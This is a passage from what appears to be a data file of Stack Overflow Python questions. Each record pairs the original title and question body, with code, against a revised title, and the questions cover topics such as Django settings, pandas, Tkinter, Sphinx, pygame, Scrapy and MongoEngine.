Windows?EDIT_2Excerpt from a bookPROBLEMEnvironment variable DJANGO_SETTINGS_MODULE is undefined.SOLUTIONRun the command python manage.py shell rather than python.MY QUESTION --> ON WHAT DIRECTORY?///CAN YOU SET IT FOR ONCE OR IS IT DIFFERENT PER PROJECT?MY PROJECT IS STRUCTURED LIKE THIS I am trying to run models.py and I have a settings.py in the C:\Python27\pysec-masterYou can find an exact copy here.MAYBE_IMPORTANT_EDITI have a file called manage.py in my project which has these contents Does this has to do anything on setting the variable? Do I need to set here here inside the loop?EDITFor the command in the IDLE from django.db import settings do i need to set a directory for the PYTHON_MODULE_SETTINGS like C:\Python27\Lib\site-packages\django\db ? <code>  C:\Python27\pysec-master(file)|__local_settings.py|__manage.py|__settings.py|__C:\Python27\pysec(file) |__ __init__.py |__example.py |__models.py |__xbrl.py |__xbrl_fundamentals.py #!/usr/bin/env pythonimport osimport sysif __name__ == ""__main__"": os.environ.setdefault(""DJANGO_SETTINGS_MODULE"", ""settings"") from django.core.management import execute_from_command_line execute_from_command_line(sys.argv)",Set DJANGO_SETTINGS_MODULE as an Environment Variable in Windows permanently
"Python ""interrupt"""," I have a Python 2.7 program running an infinite while loop and I want to incorporate a timer interrupt.What I aim to do is to set off a timer at some point in the loop, and when 5 seconds have elapsed I want the code to branch to a specific part of the while loop.What I have been doing so far is the following:in each iteration of the while loop I am checking how much time has elapsed when I reach that point in the code using and if the difference exceeds 5 I run the chunk of code I mean to runHowever that way 7 seconds might pass before I evaluate the time, it will be >5sec but I want to go there exactly when 5 seconds passAlso, I need this to work for more than 1 counter (possibly up to a 100) but I do not want the interrupts to interrupt each other. Using Timer did not work either.I know this can be done using timer interrupts in assembly but how can I do that in python? <code>  time.clock()",Real-time interrupts in Python
Python: image filtering with scikit-image?," I'm moving to python from a Matlab background, and there are a few elementary operations I've yet to conquer in Python/skimage:How can I apply a user-generated linear filter (given as a small 2d array) to an image? I can do it with scipy.ndimage.convolve, but is there a method in skimage?In Matlab, image filtering always returns a result of the same numeric type as its input, be it uint8 or float. Does skimage behave the same way?Does skimage include unsharp masking somewhere? (I've found an unsharp masking filter in PIL but that's a bit of a pain, as PIL uses its own Image class, rather than ndarrays).Is there a method, maybe similar to Matlab's ""colfilt"" by which a user can apply a non-linear filter to an image? The idea is that the user supplies a function which produces a single number from a 3x3 array, say; then that function is applied across the image as a spatial filter. <code> ",Image filtering with scikit-image?
Python requests library Response handle," returns: How can get the origin and headers/Host values? <code>  import requestsr = requests.get('http://httpbin.org/get');r.text u'{\n ""url"": ""http://httpbin.org/get"",\n ""headers"": {\n ""Host"": ""httpbin.org"",\n ""Accept-Encoding"": ""gzip, deflate, compress"",\n ""Connection"": ""close"",\n ""Accept"": ""*/*"",\n ""User-Agent"": ""python-requests/2.2.1 CPython/2.7.5 Windows/7"",\n ""X-Request-Id"": ""db302999-d07f-4dd6-8c1e-14db45d39fb0""\n },\n ""origin"": ""61.228.172.190"",\n ""args"": {}\n}'",Python requests: get attributes from returned JSON string
Pandas: Replacing column values in dataframe, I'm trying to replace the values in one column of a dataframe. The column ('female') only contains the values 'female' and 'male'. I have tried the following: But receive the exact same copy of the previous results.I would ideally like to get some output which resembles the following loop element-wise. I've looked through the gotchas documentation (http://pandas.pydata.org/pandas-docs/stable/gotchas.html) but cannot figure out why nothing happens.Any help will be appreciated. <code>  w['female']['female']='1'w['female']['male']='0' if w['female'] =='female': w['female'] = '1';else: w['female'] = '0';,Replacing column values in a pandas DataFrame
Embedding a Pygame window into a Tkinter frame," A friend and I are making a game in pygame. We would like to have a pygame window embedded into a tkinter or WxPython frame, so that we can include text input, buttons, and dropdown menus that are supported by WX or Tkinter. I have scoured the internet for an answer, but all I have found are people asking the same question, none of these have been well answered. What would be the best way implement a pygame display embedded into a tkinter or WX frame? (TKinter is preferable)Any other way in which these features can be included alongside a pygame display would also work. <code> ",Embedding a Pygame window into a Tkinter or WxPython frame
Pandas filter rows," I have some values in the risk column that are neither, Small, Medium or High. I want to delete the rows with the value not being Small, Medium and High. I tried the following: But this returns an empty DataFrame. How can I filter them correctly? <code>  df = df[(df.risk == ""Small"") | (df.risk == ""Medium"") | (df.risk == ""High"")]",Pandas filter rows based on multiple conditions
Python method in tkinter that the button stays pressed until a different comand," I am trying to find a way Tkinter to make the Start button stay pressed until I press the Stop button. <code>  from Tkinter import *import tkMessageBoxclass MainWindow(Frame): def __init__(self): Frame.__init__(self) self.master.title(""input"") self.master.minsize(250, 150) self.grid(sticky=E+W+N+S) top=self.winfo_toplevel() top.rowconfigure(0, weight=1) top.columnconfigure(0, weight=1) for i in range(2):self.rowconfigure(i, weight=1) self.columnconfigure(1, weight=1) self.button0 = Button(self, text=""Start"", command=self.save, activeforeground=""red"") self.button0.grid(row=0, column=0, columnspan=2, pady=2, padx=2, sticky=E+W+N+S) self.button1 = Button(self, text=""Stop"", command=self.stop, activeforeground=""red"") self.button1.grid(row=1, column=0, columnspan=2, pady=2, padx=2, sticky=E+W+N+S) def save(self): pass def stop(self): passif __name__==""__main__"": d=MainWindow() d.mainloop()",How to make button in Python Tkinter stay pressed until another one is pressed
How to make button in Python Tkinter stay pressed until the another one is pressed (or a function is called)," I am trying to find a way Tkinter to make the Start button stay pressed until I press the Stop button. <code>  from Tkinter import *import tkMessageBoxclass MainWindow(Frame): def __init__(self): Frame.__init__(self) self.master.title(""input"") self.master.minsize(250, 150) self.grid(sticky=E+W+N+S) top=self.winfo_toplevel() top.rowconfigure(0, weight=1) top.columnconfigure(0, weight=1) for i in range(2):self.rowconfigure(i, weight=1) self.columnconfigure(1, weight=1) self.button0 = Button(self, text=""Start"", command=self.save, activeforeground=""red"") self.button0.grid(row=0, column=0, columnspan=2, pady=2, padx=2, sticky=E+W+N+S) self.button1 = Button(self, text=""Stop"", command=self.stop, activeforeground=""red"") self.button1.grid(row=1, column=0, columnspan=2, pady=2, padx=2, sticky=E+W+N+S) def save(self): pass def stop(self): passif __name__==""__main__"": d=MainWindow() d.mainloop()",How to make button in Python Tkinter stay pressed until another one is pressed
django - comparing old and new filed value before saving," I have a django model, and I need to compare old and new values of field BEFORE saving.I've tried the save() inheritance, and pre_save signal. It was triggered correctly, but I can't find the list of actually changed fields and can't compare old and new values. Is there a way? I need it for optimization of pre-save actions.Thank you! <code> ",django - comparing old and new field value before saving
python n-gram markov chain transition table," I'm trying to build an n-gram markov model from a given piece of text, and then access the transition table for it so I can calculate the conditional entropy for each sequence of words of length n (the grams). For example, in a 2-gram model, after reading in a corpus of text""dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase cats dogs chase people""and building an internal transition table, the state ""dogs chase"" may transition to the state ""chase cats"" with probability 0.9, and to state ""chase people"" with probability 0.1. If I know of the possible transitions, I can calculate the conditional entropy.Are there any good python libraries for doing this? I've checked NLTK, SRILM, and others but haven't found much. <code> ",n-gram markov chain transition table
Keep other columns when using min() with groupby," I'm using groupby on a pandas dataframe to drop all rows that don't have the minimum of a specific column. Something like this: However, if I have more than those two columns, the other columns (e.g. otherstuff in my example) get dropped. Can I keep those columns using groupby, or am I going to have to find a different way to drop the rows?My data looks like: and should end up like: but what I'm getting is: I've been looking through the documentation and can't find anything. I tried: But none of those work (I realized with the last one that the syntax is meant for aggregating after a group is created). <code>  df1 = df.groupby(""item"", as_index=False)[""diff""].min() item diff otherstuff 0 1 2 1 1 1 1 2 2 1 3 7 3 2 -1 0 4 2 1 3 5 2 4 9 6 2 -6 2 7 3 0 0 8 3 2 9 item diff otherstuff 0 1 1 2 1 2 -6 2 2 3 0 0 item diff 0 1 1 1 2 -6 2 3 0 df1 = df.groupby([""item"", ""otherstuff""], as_index=false)[""diff""].min()df1 = df.groupby(""item"", as_index=false)[""diff""].min()[""otherstuff""]df1 = df.groupby(""item"", as_index=false)[""otherstuff"", ""diff""].min()",Keep other columns when doing groupby
best way to add sequential counter column using pandas.groupby," I feel like there is a better way than this: To achieve this: Is there a way to do it that avoids the callback? <code>  import pandas as pddf = pd.DataFrame( columns="" index c1 c2 v1 "".split(), data= [ [ 0, ""A"", ""X"", 3, ], [ 1, ""A"", ""X"", 5, ], [ 2, ""A"", ""Y"", 7, ], [ 3, ""A"", ""Y"", 1, ], [ 4, ""B"", ""X"", 3, ], [ 5, ""B"", ""X"", 1, ], [ 6, ""B"", ""X"", 3, ], [ 7, ""B"", ""Y"", 1, ], [ 8, ""C"", ""X"", 7, ], [ 9, ""C"", ""Y"", 4, ], [ 10, ""C"", ""Y"", 1, ], [ 11, ""C"", ""Y"", 6, ],]).set_index(""index"", drop=True)def callback(x): x['seq'] = range(1, x.shape[0] + 1) return xdf = df.groupby(['c1', 'c2']).apply(callback)print df c1 c2 v1 seq0 A X 3 11 A X 5 22 A Y 7 13 A Y 1 24 B X 3 15 B X 1 26 B X 3 37 B Y 1 18 C X 7 19 C Y 4 110 C Y 1 211 C Y 6 3",How to add sequential counter column on groups using Pandas groupby
How to add custom css file," How can I add a custom css file? The following config does not work: Result: <code>  # conf.pyhtml_static_path = ['_static']html_theme = 'default'html_theme_options = { 'cssfiles': ['_static/style.css']} C:\temp\test-docs\docs>make htmlRunning Sphinx v1.2.2loading pickled environment... not yet createdbuilding [html]: targets for 2 source files that are out of dateupdating environment: 2 added, 0 changed, 0 removedreading sources... [ 50%] helpreading sources... [100%] indexlooking for now-outdated files... none foundpickling environment... donechecking consistency... donepreparing documents...Theme error:unsupported theme option 'cssfiles' given",How to add custom css file to Sphinx?
How to add a custom css file?," How can I add a custom css file? The following config does not work: Result: <code>  # conf.pyhtml_static_path = ['_static']html_theme = 'default'html_theme_options = { 'cssfiles': ['_static/style.css']} C:\temp\test-docs\docs>make htmlRunning Sphinx v1.2.2loading pickled environment... not yet createdbuilding [html]: targets for 2 source files that are out of dateupdating environment: 2 added, 0 changed, 0 removedreading sources... [ 50%] helpreading sources... [100%] indexlooking for now-outdated files... none foundpickling environment... donechecking consistency... donepreparing documents...Theme error:unsupported theme option 'cssfiles' given",How to add custom css file to Sphinx?
How to add a custom css file to Sphinx?," How can I add a custom css file? The following config does not work: Result: <code>  # conf.pyhtml_static_path = ['_static']html_theme = 'default'html_theme_options = { 'cssfiles': ['_static/style.css']} C:\temp\test-docs\docs>make htmlRunning Sphinx v1.2.2loading pickled environment... not yet createdbuilding [html]: targets for 2 source files that are out of dateupdating environment: 2 added, 0 changed, 0 removedreading sources... [ 50%] helpreading sources... [100%] indexlooking for now-outdated files... none foundpickling environment... donechecking consistency... donepreparing documents...Theme error:unsupported theme option 'cssfiles' given",How to add custom css file to Sphinx?
Django 1.6 urls.py with class based views," I was poking around my friends project and as I looked through the urls.py file i noticed this: I just recently learned about class based views, and it all makes sense to me except for the last bit name='careers_contact'. I also can't seem to find the meaning of this online. Can someone shed light on what this is, where that name lives, and what its doing? <code>  url(r'^apply/$', contact.as_view(), name='careers_contact'),","Django urls.py, what does the name parameter do?"
What is more efficient .objects.filter().exists() or get() and a try, I'm writing tests for a django application and I want to check if an object has been saved to the database. Which is the most efficient/correct way to do it? or <code>  User.objects.filter(username=testusername).exists() try: User.objects.get(username=testusername)except User.DoesNotExist:,What is more efficient .objects.filter().exists() or get() wrapped on a try
keyboardinterrupt invalid syntax raspberry pi," I have a problem with my code working with raspberry pi.I just started with python so i need some help.This is the code: when I run this error appear in the console: RuntimeWarning: This channel is already in use, continuing anyway. Use GPIO.setwarnings(False) to disable warnings. GPIO.setup(led1, GPIO.OUT) and: RuntimeWarning: This channel is already in use, continuing anyway. Use GPIO.setwarnings(False) to disable warnings. GPIO.setup(led2, GPIO.OUT)If I understand correctly the command GPIO.cleanup() should reset all pin of GPIO port and turn off the led.but this in not happening in fact one of the led remain on.How can change my code to resolve this issue? <code>  import RPi.GPIO as GPIOimport timeGPIO.setmode(GPIO.BCM)led1=22led2=17GPIO.setup(led1, GPIO.OUT)GPIO.setup(led2, GPIO.OUT)def blink(): GPIO.output(led1, 1) time.sleep(1) GPIO.output(led1, 0) GPIO.output(led2, 1) time.sleep(1) GPIO.output(led2, 0)while(blink): blink()try: main()except KeyboardInterrupt: GPIO.cleanup()",RuntimeWarnings with GPIO.setup and GPIO.cleanup not work with KeyboardInterrupt
How do we delete a shape thats already been created in Python canvas?," Consider: How do we delete this rectangle that's been created?This is in reference to a game I am creating. It's a simple game where if the ball hits the block, the block should disappear. But if I do something like this: And then: It doesn't work. How can I delete the block when the ball hits it? <code>  from Tkinter import *a = Tk()canvas = Canvas(a, width = 500, height = 500)canvas.pack()canvas.create_rectangle(0, 0, 100, 100) class Block: def __init__(self,canvas,color): self.canvas = canvas self.id = canvas.create_rectangle(10, 10, 110, 20, fill=color ) self.id1 = canvas.create_rectangle(115, 10, 215, 20, fill=color) self.id2 = canvas.create_rectangle(220, 10, 320, 20, fill=color) self.id3 = canvas.create_rectangle(325, 10, 425, 20, fill=color) self.id4 = canvas.create_rectangle(430, 10, 530, 20, fill=color) self.id5 = canvas.create_rectangle(100, 150, 200, 160, fill=color) self.id6 = canvas.create_rectangle(350, 150, 450, 160, fill=color) self.x = 0 def hit_block(self,pos): block_pos = self.canvas.coords(self.block.id) List = [block_pos] for i in List: if pos[0] >= i[0] and pos[2] <= i[2]: if pos[1] >= i[1] and pos[1] <= i[3]: canvas.delete(block.id) self.score() global a a += 1 return True return False",How do we delete a shape that's already been created in Tkinter canvas?
How do we delete a shape thats already been created in Tkinter canvas?," Consider: How do we delete this rectangle that's been created?This is in reference to a game I am creating. It's a simple game where if the ball hits the block, the block should disappear. But if I do something like this: And then: It doesn't work. How can I delete the block when the ball hits it? <code>  from Tkinter import *a = Tk()canvas = Canvas(a, width = 500, height = 500)canvas.pack()canvas.create_rectangle(0, 0, 100, 100) class Block: def __init__(self,canvas,color): self.canvas = canvas self.id = canvas.create_rectangle(10, 10, 110, 20, fill=color ) self.id1 = canvas.create_rectangle(115, 10, 215, 20, fill=color) self.id2 = canvas.create_rectangle(220, 10, 320, 20, fill=color) self.id3 = canvas.create_rectangle(325, 10, 425, 20, fill=color) self.id4 = canvas.create_rectangle(430, 10, 530, 20, fill=color) self.id5 = canvas.create_rectangle(100, 150, 200, 160, fill=color) self.id6 = canvas.create_rectangle(350, 150, 450, 160, fill=color) self.x = 0 def hit_block(self,pos): block_pos = self.canvas.coords(self.block.id) List = [block_pos] for i in List: if pos[0] >= i[0] and pos[2] <= i[2]: if pos[1] >= i[1] and pos[1] <= i[3]: canvas.delete(block.id) self.score() global a a += 1 return True return False",How do we delete a shape that's already been created in Tkinter canvas?
'pip' is not recognized as an internal or external command - Installing Django Windows 8," I'm running into a weird error when trying to install Django on my computer.This is the sequence that I typed into my command line: What could be causing this?This is what I get when I type in echo %PATH%: <code>  C:\Python34> python get-pip.pyRequirement already up-to-date: pip in c:\python34\lib\site-packagesCleaning up...C:\Python34> pip install Django'pip' is not recognized as an internal or external command,operable program or batch file.C:\Python34> lib\site-packages\pip install Django'lib\site-packages\pip' is not recognized as an internal or external command,operable program or batch file. C:\Python34>echo %PATH%C:\Program Files\ImageMagick-6.8.8-Q16;C:\Program Files (x86)\Intel\iCLS Client\;C:\Program Files\Intel\iCLS Client\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files (x86)\Windows Live\Shared;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x86;C:\Program Files (x86)\Intel\OpenCL SDK\2.0\bin\x64;C:\Program Files\Intel\Intel(R) Management Engine Components\DAL;C:\Program Files\Intel\Intel(R) Management Engine Components\IPT;C:\Program Files (x86)\Intel\Intel(R) Management Engine Components\DAL;C:\Program Files (x86)\Intel\Intel(R) Management Engine Components\IPT;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Heroku\bin;C:\Program Files (x86)\git\cmd;C:\RailsInstaller\Ruby2.0.0\bin;C:\RailsInstaller\Git\cmd;C:\RailsInstaller\Ruby1.9.3\bin;C:\Users\Javi\AppData\Roaming\npm",'pip' is not recognized as an internal or external command
How to use glob to read limited set of files?," How to use glob to only read limited set of files?I have json files named numbers from 50 to 20000 (e.g. 50.json,51.json,52.json...19999.json,20000.json) within the same directory. I want to read only the files numbered from 15000 to 18000. To do so I'm using a glob, as shown below, but it generates an empty list every time I try to filter out for the numbers. I've tried my best to follow this link (https://docs.python.org/2/library/glob.html), but I'm not sure what I'm doing wrong. Also, what if I wanted files with any number greater than 18000? <code>  >>> directory = ""/Users/Chris/Dropbox"">>> read_files = glob.glob(directory+""/[15000-18000].*"")>>> print read_files[]",How to use glob to read limited set of files with numeric names?
Python - calculation error?," What should print (-2 ** 2) return? According to my calculations it should be 4, but interpreter returns -4.Is this Python's thing or my math is that terrible? <code> ",Calculation error with pow operator
Interposition a Python socket library," I am working on a project that aims to augment the Python socket messages with partial ordering information. The library I'm building is written in Python, and needs to be interposed on an existing system's messages sent through the socket functions.I have read some of the resources out there, namely the answer by @Omnifarious at this question python-importing-from-builtin-library-when-module-with-same-name-exist There is an extremely ugly and horrible thing you can do that does not involve hooking the import mechanism. This is something you should probably not do, but it will likely work. It turns your calendar module into a hybrid of the system calendar module and your calendar module.I have implemented the import mechanism solution, but we have decided this is not the direction we'd like to take, since it relies too much on the environment. The solution to merge classes into a hybrid, rather than relying on the import mechanisms, seems to be the best approach in my case. Why has the hybrid been called an ugly and horrible solution? I'd like to start implementing it in my project but I am wary of the warnings. It does seem a bit hackish, but since it would be part of an installation script, wouldn't it be OK to run this once?Here is a code snippet where the interposition needs to intercept the socket message before it's sent: <code>  class vector_clock: def __init__(self): """""" Initiate the clock with the object """""" self.clock = [0,0] def sendMessage(self): """""" Send Message to the server """""" self.msg = ""This is the test message to that will be interposed on"" self.vector_clock.increment(0) # We are clock position 0 # Some extraneous formatting details removed for brevity. # connectAndSend needs interpositioning to include the vector clock self.client.connectAndSend(totalMsg); self.client.s.close()",Why is merging Python system classes with custom classes less desirable than hooking the import mechanism?
Why is merging Python system classes with custom classes more ugly and horrible than hooking the import?," I am working on a project that aims to augment the Python socket messages with partial ordering information. The library I'm building is written in Python, and needs to be interposed on an existing system's messages sent through the socket functions.I have read some of the resources out there, namely the answer by @Omnifarious at this question python-importing-from-builtin-library-when-module-with-same-name-exist There is an extremely ugly and horrible thing you can do that does not involve hooking the import mechanism. This is something you should probably not do, but it will likely work. It turns your calendar module into a hybrid of the system calendar module and your calendar module.I have implemented the import mechanism solution, but we have decided this is not the direction we'd like to take, since it relies too much on the environment. The solution to merge classes into a hybrid, rather than relying on the import mechanisms, seems to be the best approach in my case. Why has the hybrid been called an ugly and horrible solution? I'd like to start implementing it in my project but I am wary of the warnings. It does seem a bit hackish, but since it would be part of an installation script, wouldn't it be OK to run this once?Here is a code snippet where the interposition needs to intercept the socket message before it's sent: <code>  class vector_clock: def __init__(self): """""" Initiate the clock with the object """""" self.clock = [0,0] def sendMessage(self): """""" Send Message to the server """""" self.msg = ""This is the test message to that will be interposed on"" self.vector_clock.increment(0) # We are clock position 0 # Some extraneous formatting details removed for brevity. # connectAndSend needs interpositioning to include the vector clock self.client.connectAndSend(totalMsg); self.client.s.close()",Why is merging Python system classes with custom classes less desirable than hooking the import mechanism?
Can not established WEbsocket secure connection on Firefox," I am stucked with Firefox. I could not make Websocket work on it. I use Tornado Websocket and I initialized it by code below: And I initialized it on Javascript side like this: This code works fine on Chrome, meanwhile I created the cert by myself and run the page under HTTPS. But Firefox keeps saying that: I google it and found too many thoughts but none of'em worked for me :(Any help will be appreciated. <code>  app = Application([(r'/mypath/ws', WSHandler)])http_server = HTTPServer(app, ssl_options={ ""certfile"": ""~/certs/websocket.crt"", ""keyfile"": ""~/certs/websocket.key"" })http_server.listen(""443"") var WS = new WebSocket(""wss://websocket.localhost/mypath/ws""); Firefox can't establish a connection to the server at wss://websocket.localhost/mypath/ws.",Can not established Websocket secure connection on Firefox
Get the index which caused IndexError exception in Python," Is it possible to get the index that caused an IndexError exception?Sample code : <code>  arr = [0, 2, 3, 4, 5, 6, 6]try: print arr[10] # This will cause IndexErrorexcept IndexError as e: print e.args # Can I get which index (in this case 10) caused the exception?",Get the index that caused an IndexError exception
Python 2 with Pandas: How does one recover the not union of two dataframes?," I have two data frames and the second is a subset of the first. How do I now find the portion of the first dataframe that is not contained in the second one? For example: Thanks for your help!Edit: I initially was calling the intersection the union, but have since changed this. <code>  new_dataframe_1 A B C D1 a b c d2 e f g h3 i j k l4 m n o pnew_dataframe_2 A B C D1 a b c d3 i j k lnew_dataframe_3 = not intersection of new_dataframe_1 and new_dataframe_2 A B C D2 e f g h4 m n o p",Python 2.7 with Pandas: How does one recover the non intersecting parts of two dataframes?
Python 2 with Pandas: How does one recover the not intersection of two dataframes?," I have two data frames and the second is a subset of the first. How do I now find the portion of the first dataframe that is not contained in the second one? For example: Thanks for your help!Edit: I initially was calling the intersection the union, but have since changed this. <code>  new_dataframe_1 A B C D1 a b c d2 e f g h3 i j k l4 m n o pnew_dataframe_2 A B C D1 a b c d3 i j k lnew_dataframe_3 = not intersection of new_dataframe_1 and new_dataframe_2 A B C D2 e f g h4 m n o p",Python 2.7 with Pandas: How does one recover the non intersecting parts of two dataframes?
How to implement efficient filtering logic in python?," I am trying to create a program that storesFruit NameFruit TypeFruit ColorFruit Sizeand show them back to the user upon request. The user will be given pre-defined choices to select from. Something like this:My database table will be like this:Now, I am trying to implement a filter function that lets the user select Fruit TypeFruit ColorFruit SizeAnd it will give out all the Fruit Names that have the above properties. But now, I have an additional option, ""All"".Assuming that I have already queried out the data for all the fruits and stored them in dictionary like this: How do I get the list of fruit names that has the three properties that the user selected? (For example, if the user selected 'fleshy' type , 'All' color, 'All' size -- it should return ['apple','orange'].)I have thought of using if statement, but as the number of properties grow, I would have to write so many lines of if and else which I don't think is feasible.I am using Python 2.7 with PyQt 4 and the SQLite 3 database on Windows XP SP3 32-bit. <code>  myfruits = { 'apple':('fleshy','red','medium'), 'orange':('fleshy','orange','medium'), 'peanut':('dry','red','small'),...}",How to implement efficient filtering logic in Python?
Pandas - conditionally select column based on row value," Is there a pandas function that allows selection from different columns based on a condition? This is analogous to a CASE statement in a SQL Select clause. For example, say I have the following DataFrame: I want to select from column 'x' when Country=='USA', and from column 'y' when Country=='Canada', resulting in something like the following: <code>  foo = DataFrame( [['USA',1,2], ['Canada',3,4], ['Canada',5,6]], columns = ('Country', 'x', 'y')) Country x y z0 USA 1 2 11 Canada 3 4 42 Canada 5 6 6[3 rows x 4 columns]",Pandas - conditionally select source column of data for a new column based on row value
python library pygame: centering text," I have some code: How can I get the text's width and height, so I can center text like this: If this is not possible, what is another way ?I've found this example, but I didn't really understand it. <code>  # draw textfont = pygame.font.Font(None, 25)text = font.render(""You win!"", True, BLACK)screen.blit(text, [SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2]) screen.blit(text, [SCREEN_WIDTH / 2 - text_w / 2, SCREEN_HEIGHT / 2 - text_h / 2])",How to Center Text in Pygame
Pygame - How to Center Text," I have some code: How can I get the text's width and height, so I can center text like this: If this is not possible, what is another way ?I've found this example, but I didn't really understand it. <code>  # draw textfont = pygame.font.Font(None, 25)text = font.render(""You win!"", True, BLACK)screen.blit(text, [SCREEN_WIDTH / 2, SCREEN_HEIGHT / 2]) screen.blit(text, [SCREEN_WIDTH / 2 - text_w / 2, SCREEN_HEIGHT / 2 - text_h / 2])",How to Center Text in Pygame
How to get the Jinja2 generated input value," In my HTML file, I have: I want to modify the user name in the webpage by clicking update button in each row. But I always get the first ""firstname"" using the following python code in the backend: How can I solve this problem? <code>  <table> {% for user in user_data_html %} <tr> <td> <input id=""firstname"" name=""firstname"" type=""text"" value='{{ user.FirstName }}' /> </td> <td> <input name=""submit"" type=""submit"" value='update' /> </td> </tr> {% else %} <tr><td>no user found</td></tr> {% endfor %} </table> firstname = request.form['firstname']",How to get the Jinja2 generated input value data?
Requests not able call route in same Flask application," I am not able to successfully use Python Requests to call a second route in the same application using Flask. I know that its best practice to call the function directly, but I need it to call using the URL using requests. For example: <code>  from flask import Flaskimport requestsapp = Flask(__name__)@app.route(""/"")def hello(): return ""Hello World!"" # This works@app.route(""/myrequest"")def myrequest(): #r = requests.get('http://www.stackoverflow.com', timeout=5).text # This works, but is external #r = hello() # This works, but need requests to work r = requests.get('http://127.0.0.1:5000/', timeout=5).text # This does NOT work - requests.exceptions.Timeout return rif __name__ == ""__main__"": app.run(debug=True, port=5000)",Requests not able call multiple routes in same Flask application
How to convert raw javascript object to python object?," When screen-scraping some website, I extract data from <script> tags.The data I get is not in standard JSON format. I cannot use json.loads(). Currently, I use regex to transform the raw data to JSON format.But I feel pretty bad when I encounter complicated data structure.Do you have some better solutions? <code>  # fromjs_obj = '{x:1, y:2, z:3}'# topy_obj = {'x':1, 'y':2, 'z':3}",How to convert raw javascript object to a dictionary?
How to convert raw javascript object to python dictionary?," When screen-scraping some website, I extract data from <script> tags.The data I get is not in standard JSON format. I cannot use json.loads(). Currently, I use regex to transform the raw data to JSON format.But I feel pretty bad when I encounter complicated data structure.Do you have some better solutions? <code>  # fromjs_obj = '{x:1, y:2, z:3}'# topy_obj = {'x':1, 'y':2, 'z':3}",How to convert raw javascript object to a dictionary?
import a module with parameter in python," Is it possible to import a module with some parameter in python ?All I mean by parameter is that there exists a variable in the module which is not initialized in that module, still I am using that variable in that module. In short, I want behavior similar to a function but unlike function, I want the variables of module to be exposed in the calling code.eg a.py: b.py: I want all random variables in a.py to be exposed to MCMC. I am open to a better approach for my problem at hand, but I would also like to know whether passing arguments to modules is possible in python or not. <code>  #lists like data, count, prob_distribution are constructed from training_pool (not initialized in this file)x = pymc.Uniform('x', lower = 0, upper = 1)rv = [ Multinomial(""rv""+str(i), count[i], prob_distribution[i], value = data[i], observed=True) for i in xrange(0, len(count)) ] import a #I want some way tr pass value of training_poolm = pymc.MCMC(a)",Import a module with parameter in python
Python yntaxError: Non-ASCII character '\xe2' in file," I have just switched from using running a Django App under Python 3 to Using Python 2.7. I now get this error: The code its referring to is just a comment: Why?This works: <code>  SyntaxError: Non-ASCII character '\xe2' in file /Users/user/Documents/workspace/testpro/testpro/apps/common/models/vendor.py on line 9, but no encoding declared; see http://www.python.org/peps/pep-0263.html for details class Vendor(BaseModel): """""" A company manages owns one of more stores. """""" name = models.CharField(max_length=255) def __unicode__(self): return self.name class Vendor(BaseModel): """""" """""" name = models.CharField(max_length=255) def __unicode__(self): return self.name",Python SyntaxError: Non-ASCII character '\xe2' in file
Stop Redirect(301) request in Scrapy," Scrapy can request URLs with GET parameters to interactively explore the response: But with some websites, my request gets 301 redirected and the URL parameters are stripped: When I visit http://foo.com/mypage/?bar=baz in my browser as normal I don't get redirected and the GET parameters remain.Can anyone suggest how I might avoid being redirected? <code>  scrapy shell ""https://duckduckgo.com/?q=foo"" DEBUG: Redirecting (301) to <GET http://foo.com/mypage/> from <GET http://foo.com/mypage/?bar=baz>DEBUG: Crawled (200) <GET http://foo.com/mypage/> (referer: None)",Scrapy shell gets 301 redirected to URL without parameters
How do I run this MongoDB query using MongoEngine (Python)?," I can't tell if MongoEngine supports the aggregate framework.Is it possible to run this query using MongoEngine? If not, can I just run it directly (raw) through MongoEngine? <code>  db.collection.aggregate([ { ""$group"": { ""_id"": { ""year"": { ""$year"": ""$utc_timestamp"" }, ""month"": { ""$month"": ""$utc_timestamp"" }, ""day"": { ""$dayOfMonth"": ""$utc_timestamp"" }, }, ""defects"": { ""$sum"": { ""$cond"": [ { ""$eq"": [ ""$status"", ""defect"" ] }, 1, 0 ]} }, ""totalCount"": { ""$sum"": 1 } }}, { ""$project"": { ""defect_rate"": { ""$cond"": [ { ""$eq"": [ ""$defects"", 0 ] }, 0, { ""$divide"": [ ""$defects"", ""$totalCount"" ] } ] } }}])",How to run this MongoDB query using MongoEngine
How can i get the IP Address of eth0 in Pyton?," When an error occurs in a Python script on Unix, an email is sent.I have been asked to add {Testing Environment} to the subject line of the email if the IP address is 192.168.100.37 which is the testing server. This way we can have one version of a script and a way to tell if the email is coming from messed up data on the testing server.However, when I google I keep finding this code: However, that's giving me the IP address of 127.0.1.1. When I use ifconfig I get this Firstly, I don't know where it got 127.0.1.1 from, but either way that's not what I want. When I google I keep coming to the same syntax, Bash scripts or netifaces and I'm trying to use standard libraries.So how can I get the IP address of eth0 in Python? <code>  import socketsocket.gethostbyname(socket.gethostname()) eth0 Link encap:Ethernet HWaddr 00:1c:c4:2c:c8:3e inet addr:192.168.100.37 Bcast:192.168.100.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:75760697 errors:0 dropped:411180 overruns:0 frame:0 TX packets:23166399 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:59525958247 (59.5 GB) TX bytes:10142130096 (10.1 GB) Interrupt:19 Memory:f0500000-f0520000lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:25573544 errors:0 dropped:0 overruns:0 frame:0 TX packets:25573544 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:44531490070 (44.5 GB) TX bytes:44531490070 (44.5 GB)",How can I get the IP address from a NIC (network interface controller) in Python?
